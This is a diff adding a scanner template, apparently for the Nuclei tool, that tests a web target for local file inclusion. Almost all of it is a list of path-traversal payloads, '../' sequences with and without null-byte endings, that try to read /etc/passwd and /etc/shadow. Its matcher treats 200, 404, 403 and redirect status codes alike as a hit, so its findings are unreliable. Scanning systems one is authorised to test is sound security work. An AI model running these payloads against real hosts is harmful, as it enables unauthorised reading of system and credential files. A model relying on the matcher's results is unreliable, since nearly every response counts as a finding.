@@ -1,0 +1,75 @@
+id: LFI
+
+info:
+  name: Local File Inclusion
+  author: pikpikcu
+  severity: high
+
+requests:
+  - method: GET
+    path:
+     # - '{{BaseURL}}../../../../../../../../../../../../../../../../etc/passwd'
+     # - '{{BaseURL}}../../../../../../../../../../../../etc/passwd%00'
+      - '{{BaseURL}}/etc/master.passwd'
+      - '{{BaseURL}}/master.passwd'
+      - '{{BaseURL}}/etc/passwd'
+      - '{{BaseURL}}/etc/shadow%00'
+      - '{{BaseURL}}/etc/passwd'
+      - '{{BaseURL}}/etc/passwd%00'
+      - '{{BaseURL}}../etc/passwd'
+      - '{{BaseURL}}../etc/passwd%00'
+      - '{{BaseURL}}../../etc/passwd'
+      - '{{BaseURL}}../../etc/passwd%00'
+      - '{{BaseURL}}../../../etc/passwd'
+      - '{{BaseURL}}../../../etc/passwd%00'
+      - '{{BaseURL}}../../../../etc/passwd'
+      - '{{BaseURL}}../../../../etc/passwd%00'
+      - '{{BaseURL}}../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../etc/passwd%00'
+      - '{{BaseURL}}../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../etc/passwd%00'
+      - '{{BaseURL}}../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../etc/passwd%00'
+      - '{{BaseURL}}../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../etc/passwd%00'
+      - '{{BaseURL}}../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../../etc/passwd%00'
+      - '{{BaseURL}}../../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../../../etc/passwd%00'
+      - '{{BaseURL}}../../../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../../../../etc/passwd%00'
+      - '{{BaseURL}}../../../../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../../../../../etc/passwd%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../../../../../../etc/passwd%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../../../../../../../etc/passwd%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../etc/passwd%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../etc/passwd%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../etc/passwd%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../etc/passwd%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../etc/passwd%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../../etc/passwd%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../../../etc/passwd%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../../../../etc/shadow%00'
+      - '{{BaseURL}}../../../../../../etc/passwd&=%3C%3C%3C%3C'
+      - '{{BaseURL}}../../../administrator/inbox'
+      - '{{BaseURL}}../../../../../../../dev'     
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 404
+          - 403
+          - 300
+          - 301
+        part: header
